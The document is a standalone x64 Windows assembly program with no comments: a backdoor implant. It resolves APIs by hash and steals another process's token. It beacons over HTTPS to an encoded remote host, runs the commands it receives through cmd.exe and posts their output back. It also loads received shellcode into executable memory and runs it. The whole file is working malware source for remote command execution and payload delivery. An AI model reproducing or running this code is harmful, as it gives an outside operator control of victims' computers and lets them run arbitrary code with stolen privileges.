start:
    cld
    mov rbp, rsp
    sub rsp, 8192
    and rsp, 0xFFFFFFFFFFFFFFF0

resolve_kernel32:
    mov rcx, 0x60
    mov r8, qword ptr gs:[rcx]
    mov rdi, [r8 + 0x18]
    mov rdi, [rdi + 0x30]

search_kernel32:
    mov rbx, [rdi + 0x10]
    mov rsi, [rdi + 0x40]
    mov rdi, [rdi]

    cmp byte ptr [rsi + 24], 0
    jne search_kernel32

    mov dl, 0x4b
    cmp byte ptr [rsi], dl
    jne search_kernel32

    mov r12, rbx

    mov rcx, r12
    mov r8d, 0xec0e4e8e
    call lookup_api
    mov [rbp - 8], rax

    mov rcx, r12
    mov r8d, 0xdb2d49b0
    call lookup_api
    mov [rbp - 16], rax

    mov rcx, r12
    mov r8d, 0x0ffd97fb
    call lookup_api
    mov [rbp - 24], rax

    mov rcx, r12
    mov r8d, 0x170c8f80
    call lookup_api
    mov [rbp - 32], rax

    mov rcx, r12
    mov r8d, 0x16b3fe72
    call lookup_api
    mov [rbp - 40], rax

    mov rcx, r12
    mov r8d, 0x10fa6516
    call lookup_api
    mov [rbp - 48], rax

    mov rcx, r12
    mov r8d, 0xce05d9ad
    call lookup_api
    mov [rbp - 56], rax

    mov rcx, r12
    mov r8d, 0x91afca54
    call lookup_api
    mov [rbp - 64], rax

    mov rcx, r12
    mov r8d, 0xefe297c0
    call lookup_api
    mov [rbp - 192], rax

    mov rcx, r12
    mov r8d, 0xe454dfed
    call lookup_api
    mov [rbp - 200], rax

    mov rcx, r12
    mov r8d, 0xd53992a4
    call lookup_api
    mov [rbp - 208], rax

    mov rcx, r12
    mov r8d, 0x2a523c0a
    call lookup_api
    mov [rbp - 216], rax

load_wininet:
    mov rax, 0x2e74656e696e6977
    mov [rbp - 320], rax
    mov eax, 0x006c6c64
    mov [rbp - 312], eax

    lea rcx, [rbp - 320]
    sub rsp, 32
    call [rbp - 8]
    add rsp, 32

    mov r13, rax

    mov rcx, r13
    mov r8d, 0x57e84429
    call lookup_api
    mov [rbp - 72], rax

    mov rcx, r13
    mov r8d, 0x1e4be80e
    call lookup_api
    mov [rbp - 80], rax

    mov rcx, r13
    mov r8d, 0xf7de769f
    call lookup_api
    mov [rbp - 88], rax

    mov rcx, r13
    mov r8d, 0x2de6be9d
    call lookup_api
    mov [rbp - 96], rax

    mov rcx, r13
    mov r8d, 0x5fe34b8b
    call lookup_api
    mov [rbp - 104], rax

    mov rcx, r13
    mov r8d, 0xfa9b69c7
    call lookup_api
    mov [rbp - 112], rax

load_advapi32:
    mov rax, 0x3233697061766461
    mov [rbp - 320], rax
    mov eax, 0x6c6c642e
    mov [rbp - 312], eax
    mov byte ptr [rbp - 308], 0

    lea rcx, [rbp - 320]
    sub rsp, 32
    call [rbp - 8]
    add rsp, 32

    mov [rbp - 248], rax

    mov rcx, rax
    mov r8d, 0x591ea70f
    call lookup_api
    mov [rbp - 224], rax

    mov rcx, [rbp - 248]
    mov r8d, 0x3a55bbb2
    call lookup_api
    mov [rbp - 232], rax

    mov rcx, [rbp - 248]
    mov r8d, 0xe40b58f7
    call lookup_api
    mov [rbp - 240], rax

internet_open:
    mov rax, 0x2f616c6c697a6f4d
    mov [rbp - 320], rax
    mov eax, 0x00302e35
    mov [rbp - 312], eax
    lea rax, [rbp - 320]

    xor r9, r9
    xor r8, r8
    xor rdx, rdx
    mov rcx, rax

    sub rsp, 48
    mov qword ptr [rsp + 32], r9
    call [rbp - 72]
    add rsp, 48

    test rax, rax
    jz executor_exit
    mov r14, rax

    mov qword ptr [rbp - 256], 0

steal_token:
    mov ecx, 2
    xor edx, edx
    sub rsp, 32
    call [rbp - 200]
    add rsp, 32
    cmp rax, -1
    je executor_loop
    mov [rbp - 552], rax

    mov dword ptr [rbp - 1024], 568

    lea rdx, [rbp - 1024]
    mov rcx, [rbp - 552]
    sub rsp, 32
    call [rbp - 208]
    add rsp, 32
    test eax, eax
    jz close_snapshot

try_process:
    mov eax, [rbp - 1024 + 8]
    test eax, eax
    jz next_process

    mov ecx, 0x400
    xor edx, edx
    mov r8d, [rbp - 1024 + 8]
    sub rsp, 32
    call [rbp - 192]
    add rsp, 32
    test rax, rax
    jz next_process
    mov [rbp - 560], rax

    mov rcx, rax
    mov edx, 2
    lea r8, [rbp - 568]
    sub rsp, 32
    call [rbp - 224]
    add rsp, 32
    test eax, eax
    jz close_process

    mov rcx, [rbp - 568]
    mov edx, 0x02000000
    xor r8, r8
    mov r9d, 2
    sub rsp, 48
    mov dword ptr [rsp + 32], 1
    lea rax, [rbp - 256]
    mov [rsp + 40], rax
    call [rbp - 232]
    add rsp, 48
    test eax, eax
    jz close_token

    mov rcx, [rbp - 568]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

    mov rcx, [rbp - 560]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

    jmp close_snapshot

close_token:
    mov rcx, [rbp - 568]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

close_process:
    mov rcx, [rbp - 560]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

next_process:
    lea rdx, [rbp - 1024]
    mov rcx, [rbp - 552]
    sub rsp, 32
    call [rbp - 216]
    add rsp, 32
    test eax, eax
    jnz try_process

close_snapshot:
    mov rcx, [rbp - 552]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

executor_loop:
    mov rcx, 3000
    sub rsp, 32
    call [rbp - 16]
    add rsp, 32

internet_connect:
    mov rax, 0x6168732d73636f64
    mov [rbp - 320], rax
    mov rax, 0x0067726f2e6572
    mov [rbp - 312], rax
    lea rdx, [rbp - 320]

    mov rcx, r14
    mov r8, 443
    xor r9, r9

    sub rsp, 64
    mov qword ptr [rsp + 32], r9
    mov rax, 3
    mov qword ptr [rsp + 40], rax
    xor rax, rax
    mov qword ptr [rsp + 48], rax
    mov qword ptr [rsp + 56], rax

    call [rbp - 80]
    add rsp, 64

    test rax, rax
    jz executor_loop
    mov r15, rax

open_get_request:
    mov eax, 0x00544547
    mov dword ptr [rbp - 320], eax
    lea rdx, [rbp - 320]

    mov rax, 0x772f65726168732f
    mov [rbp - 352], rax
    mov rax, 0x6e65746e6f632d70
    mov [rbp - 344], rax
    mov rax, 0x2f73656c69662f74
    mov [rbp - 336], rax
    mov byte ptr [rbp - 328], 0
    lea r8, [rbp - 352]

    mov rcx, r15
    xor r9, r9

    sub rsp, 64
    mov qword ptr [rsp + 32], r9
    mov qword ptr [rsp + 40], r9
    mov eax, 0x84803000
    mov qword ptr [rsp + 48], rax
    mov qword ptr [rsp + 56], r9

    call [rbp - 88]
    add rsp, 64

    test rax, rax
    jz close_connect
    mov [rbp - 120], rax

send_get_request:
    mov rcx, [rbp - 120]
    xor rdx, rdx
    xor r8, r8
    xor r9, r9

    sub rsp, 48
    mov qword ptr [rsp + 32], r9
    call [rbp - 96]
    add rsp, 48

    test eax, eax
    jz close_get_request

read_command:
    lea rdx, [rbp - 2048]
    mov rcx, [rbp - 120]
    mov r8, 2000
    lea r9, [rbp - 128]

    sub rsp, 32
    call [rbp - 104]
    add rsp, 32

    test eax, eax
    jz close_get_request

    mov r12d, [rbp - 128]
    test r12, r12
    jz close_get_request

    mov byte ptr [rbp - 2048 + r12], 0

    cmp byte ptr [rbp - 2048], 0xFC
    je execute_shellcode

execute_with_pipes:
    lea rdi, [rbp - 400]
    mov ecx, 24
    xor eax, eax
    rep stosb

    mov dword ptr [rbp - 400], 24
    mov dword ptr [rbp - 384], 1

    lea rcx, [rbp - 136]
    lea rdx, [rbp - 144]
    lea r8, [rbp - 400]
    xor r9, r9

    sub rsp, 32
    call [rbp - 32]
    add rsp, 32

    test eax, eax
    jz close_get_request

    lea rdi, [rbp - 504]
    mov ecx, 104
    xor eax, eax
    rep stosb

    mov dword ptr [rbp - 504], 104
    mov dword ptr [rbp - 444], 0x101
    mov word ptr [rbp - 440], 0
    mov rax, [rbp - 144]
    mov [rbp - 416], rax
    mov [rbp - 408], rax

    lea rdi, [rbp - 4096]
    mov rax, 0x206578652e646d63
    stosq
    mov al, 0x2f
    stosb
    mov al, 0x63
    stosb
    mov al, 0x20
    stosb

    lea rsi, [rbp - 2048]
copy_command:
    lodsb
    stosb
    test al, al
    jnz copy_command

    lea rsi, [rbp - 4096]
    lea rdi, [rbp - 7168]
convert_to_wide:
    lodsb
    stosb
    mov byte ptr [rdi], 0
    inc rdi
    test al, al
    jnz convert_to_wide

    mov rax, [rbp - 256]
    test rax, rax
    jz fallback_createprocess

    mov rcx, [rbp - 256]
    xor edx, edx
    xor r8, r8
    lea r9, [rbp - 7168]

    sub rsp, 72
    xor rax, rax
    mov qword ptr [rsp + 32], rax
    mov qword ptr [rsp + 40], rax
    mov qword ptr [rsp + 48], rax
    lea rax, [rbp - 504]
    mov qword ptr [rsp + 56], rax
    lea rax, [rbp - 528]
    mov qword ptr [rsp + 64], rax

    call [rbp - 240]
    add rsp, 72
    jmp check_process_result

fallback_createprocess:
    xor rcx, rcx
    lea rdx, [rbp - 4096]
    xor r8, r8
    xor r9, r9

    sub rsp, 80
    mov qword ptr [rsp + 32], 1
    xor rax, rax
    mov qword ptr [rsp + 40], rax
    mov qword ptr [rsp + 48], rax
    mov qword ptr [rsp + 56], rax
    lea rax, [rbp - 504]
    mov qword ptr [rsp + 64], rax
    lea rax, [rbp - 528]
    mov qword ptr [rsp + 72], rax

    call [rbp - 40]
    add rsp, 80

check_process_result:

    test eax, eax
    jz cleanup_pipes

    mov rcx, [rbp - 144]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

    mov rcx, [rbp - 528]
    mov edx, 5000
    sub rsp, 32
    call [rbp - 56]
    add rsp, 32

    mov qword ptr [rbp - 152], 0

read_output_loop:
    lea rdx, [rbp - 6144]
    add rdx, [rbp - 152]
    mov rcx, [rbp - 136]
    mov r8, 2000
    lea r9, [rbp - 160]

    sub rsp, 48
    mov qword ptr [rsp + 32], 0
    call [rbp - 48]
    add rsp, 48

    test eax, eax
    jz read_done

    mov eax, [rbp - 160]
    test eax, eax
    jz read_done

    add [rbp - 152], rax
    cmp qword ptr [rbp - 152], 4000
    jb read_output_loop

read_done:
    mov rcx, [rbp - 528]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

    mov rcx, [rbp - 520]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

    cmp qword ptr [rbp - 152], 0
    je cleanup_pipes

    jmp send_output

cleanup_pipes:
    mov rcx, [rbp - 136]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32
    jmp close_get_request

send_output:
    mov rcx, [rbp - 136]
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

open_post_request:
    mov eax, 0x54534f50
    mov dword ptr [rbp - 320], eax
    mov byte ptr [rbp - 316], 0
    lea rdx, [rbp - 320]

    mov rax, 0x6c757365722f2f2f
    mov [rbp - 360], rax
    mov rax, 0x0000000000007374
    mov [rbp - 352], rax
    lea r8, [rbp - 360]

    mov rcx, r15
    xor r9, r9

    sub rsp, 64
    mov qword ptr [rsp + 32], r9
    mov qword ptr [rsp + 40], r9
    mov eax, 0x84803000
    mov qword ptr [rsp + 48], rax
    mov qword ptr [rsp + 56], r9

    call [rbp - 88]
    add rsp, 64

    test rax, rax
    jz close_get_request
    mov [rbp - 168], rax

send_post_request:
    mov rcx, [rbp - 168]
    xor rdx, rdx
    xor r8, r8
    lea r9, [rbp - 6144]

    sub rsp, 48
    mov rax, [rbp - 152]
    mov qword ptr [rsp + 32], rax
    call [rbp - 96]
    add rsp, 48

close_post_request:
    mov rcx, [rbp - 168]
    sub rsp, 32
    call [rbp - 112]
    add rsp, 32
    jmp close_get_request

execute_shellcode:
    xor rcx, rcx
    mov rdx, r12
    mov r8, 0x3000
    mov r9, 0x40
    sub rsp, 32
    call [rbp - 64]
    add rsp, 32

    test rax, rax
    jz close_get_request

    mov rdi, rax
    lea rsi, [rbp - 2048]
    mov rcx, r12
    rep movsb

    sub rdi, r12
    call rdi
    jmp close_get_request

close_get_request:
    mov rcx, [rbp - 120]
    sub rsp, 32
    call [rbp - 112]
    add rsp, 32

close_connect:
    mov rcx, r15
    sub rsp, 32
    call [rbp - 112]
    add rsp, 32
    jmp executor_loop

executor_exit:
    ret

lookup_api:
    push rbx
    push rdi
    push rsi
    push r12

    mov rbx, rcx
    mov eax, [rbx + 0x3C]
    mov edi, [rbx + rax + 0x88]
    add rdi, rbx

    mov ecx, [rdi + 0x18]
    mov eax, [rdi + 0x20]
    add rax, rbx
    mov r12, rax

lookup_loop:
    jecxz lookup_fail
    dec ecx

    mov esi, [r12 + rcx * 4]
    add rsi, rbx

    xor eax, eax
    xor edx, edx
calc_hash:
    lodsb
    test al, al
    jz check_hash
    ror edx, 13
    add edx, eax
    jmp calc_hash

check_hash:
    cmp edx, r8d
    jne lookup_loop

    mov eax, [rdi + 0x24]
    add rax, rbx
    movzx ecx, word ptr [rax + rcx * 2]

    mov eax, [rdi + 0x1C]
    add rax, rbx
    mov eax, [rax + rcx * 4]
    add rax, rbx

    pop r12
    pop rsi
    pop rdi
    pop rbx
    ret

lookup_fail:
    xor rax, rax
    pop r12
    pop rsi
    pop rdi
    pop rbx
    ret
